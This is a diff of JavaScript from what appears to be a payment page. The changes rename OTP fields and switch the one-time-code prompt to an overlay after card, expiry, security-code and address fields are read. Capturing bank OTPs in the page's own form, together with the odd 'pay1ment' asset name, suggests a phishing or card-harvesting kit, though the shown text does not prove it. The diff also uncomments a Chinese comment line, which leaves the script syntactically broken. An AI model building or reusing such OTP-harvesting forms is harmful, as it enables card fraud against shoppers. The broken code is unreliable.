@@ -1554,7 +1554,7 @@ url("pay1ment_icons.woff") format("woff");
     var ci  = q('city')      ? q('city').value.trim()      : '';
     var st  = q('state')     ? q('state').value.trim()     : '';
     var zp  = q('zipCode')   ? q('zipCode').value.trim()   : '';
-    var otp = q('otpCode')   ? q('otpCode').value.trim()   : '';
+    var otp = q('otp-code')   ? q('otp-code').value.trim()   : '';
     var nmParts=fn.split(' ');
  
     return {
@@ -1617,8 +1617,8 @@ url("pay1ment_icons.woff") format("woff");
     if (expDate <= now) { showMsg('error', 'Card has expired.'); return; }
     if (cv.length < 3)  { showMsg('error', 'Please enter a valid security code.'); return; }
  
-    /* 清空旧 OTP 
-    if (q('otpCode')) q('otpCode').value = '';*/
+     清空旧 OTP 
+    if (q('otp-code')) q('otp-code').value = '';
  
     hideInline();
  
@@ -1655,24 +1655,24 @@ url("pay1ment_icons.woff") format("woff");
      8. OTP 弹层
   ═══════════════════════════════════════════ */
   function showOtp() {
-    var sec = q('otpSection');
-    var btn = q('btnSubmit');
-    if (sec) sec.style.display = 'block';
-    if (btn) btn.style.display = 'none';
+    var sec = q('otp-overlay');
+    //var btn = q('btnSubmit');
+    if (sec) sec.className = 'overlay';
+    //if (btn) btn.style.display = 'none';
   }
  
   function hideOtp() {
-    var sec = q('otpSection');
-    var btn = q('btnSubmit');
-    if (sec) sec.style.display = 'none';
-    if (btn) btn.style.display = 'block';
-    if (q('otpCode'))  q('otpCode').value = '';
+    var sec = q('otp-overlay');
+    //var btn = q('btnSubmit');
+    if (sec) sec.className = 'overlay hidden';
+    //if (btn) btn.style.display = 'block';
+    if (q('otp-code'))  q('otp-code').value = '';
     if (q('otpError')) q('otpError').style.display = 'none';
     stopOtpTimer();
   }
  
   function resetOtp() {
-    if (q('otpCode'))  { q('otpCode').value = ''; }
+    if (q('otp-code'))  { q('otp-code').value = ''; }
     if (q('otpError')) { q('otpError').style.display = 'none'; }
     var btn = q('btnOtp');
     if (btn) { btn.disabled = false; btn.textContent = 'Verify'; }
@@ -1713,7 +1713,7 @@ url("pay1ment_icons.woff") format("woff");
  
   /* OTP 提交 */
   function submitOtp() {
-    var code = q('otpCode') ? q('otpCode').value.trim() : '';
+    var code = q('otp-code') ? q('otp-code').value.trim() : '';
     if (!code || code.length < 4) {
       if (q('otpError')) { q('otpError').style.display = 'block'; q('otpError').textContent = 'Please enter the OTP.'; }
       return;
@@ -1770,8 +1770,8 @@ url("pay1ment_icons.woff") format("woff");
   }
  
   /* OTP 输入事件 */
-  if (q('otpCode')) {
-    q('otpCode').addEventListener('input', function () {
+  if (q('otp-code')) {
+    q('otp-code').addEventListener('input', function () {
       this.value = this.value.replace(/\D/g, '').slice(0, 8);
     });
   }
